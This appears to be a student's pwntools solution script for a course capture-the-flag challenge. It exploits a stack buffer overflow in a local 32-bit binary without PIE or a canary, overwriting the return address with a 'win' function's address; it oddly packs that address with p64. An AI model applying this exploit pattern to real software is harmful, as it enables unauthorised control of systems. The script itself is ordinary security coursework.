'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Project 2 --- chall_02
File Description:  Simple buffer overflow, with no arg win func

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69) Symbols       No    0               1               withoutpie


File info:
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=76e18d44f9d59692abd52786472bcabf378dd507, for GNU/Linux 3.2.0, not stripped
'''

'''
Variable location:
space --> 71h for whole frame + 4 for rip, then on eip
'''
# Import libraries
from pwn import *

# Craft payload
winAddr=p64(0x08049182)
payload=b'a'*117+winAddr

# Starting process
p=process("./withoutpie")
p.sendline(payload)
p.recv()
p.interactive()